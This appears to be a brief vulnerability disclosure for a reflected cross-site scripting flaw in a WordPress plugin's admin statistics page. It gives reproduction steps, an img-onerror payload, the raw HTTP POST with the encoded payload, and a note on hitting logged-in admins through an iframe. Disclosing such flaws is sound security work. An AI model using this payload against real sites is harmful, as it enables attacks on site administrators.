1/ navigate to the page:
/wordpress/wp-admin/?page=cpd_metaboxes

2/ bottom of the page: "visitors per day"
current date is printed (e.g., 2013-03-04)
replace this field by
2013-03-04"><img src=x onerror=alert(1)>
press show.

3/ request is submitted, server reflects the sent value. filter on
server side is identity, thus pretty easy to exploit.
the payload gets executed.
----------
e.g., of exploitation:
-------------------
POST .../wordpress/wp-admin/?page=cpd_metaboxes HTTP/1.1
...

daytoshow=2013-03-04%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&showday=Show
-------------------
# requirements: victim should be authenticated as user having access
to this plugin (e.g., admin)
# this is still a practical attack in case e.g. attacker embeds an
iframe on a website he controls, and assuming the victim is logged in
wordpress, then the SOP access control is bypassed.
